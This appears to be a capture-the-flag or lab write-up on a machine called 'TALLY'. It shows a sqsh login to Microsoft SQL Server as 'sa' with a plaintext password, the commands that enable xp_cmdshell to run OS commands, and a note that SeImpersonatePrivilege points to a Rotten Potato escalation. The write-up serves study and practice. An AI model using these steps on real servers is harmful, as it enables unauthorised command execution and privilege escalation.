# Connecting to SQSH (Microsoft SQL)

```bash
$ sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G
```


xp_cmdshell is disable by default. Enabling xp_cmdshell with EXEC SP_CONFIGURE
```bash
1> xp_cmdshell 'whoami'
2> go
Msg 15281, Level 16, State 1
Server 'TALLY', Procedure 'xp_cmdshell', Line 1
SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system
administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
1> EXEC SP_CONFIGURE 'show advanced options', 1
2> reconfigure
3> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> EXEC SP_CONFIGURE 'xp_cmdshell', 1
2> reconfigure
3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
```
![[Pasted image 20211116114356.png]]

Using whoami /priv to see the tokens i have
```bash
1> xp_cmdshell 'whoami /priv'                                                                                                                                                                 
2> go
```

* Token SeImpersonatePrivilege  - chance of exploitable with rotten potato privesc
![[Pasted image 20211116114822.png]]

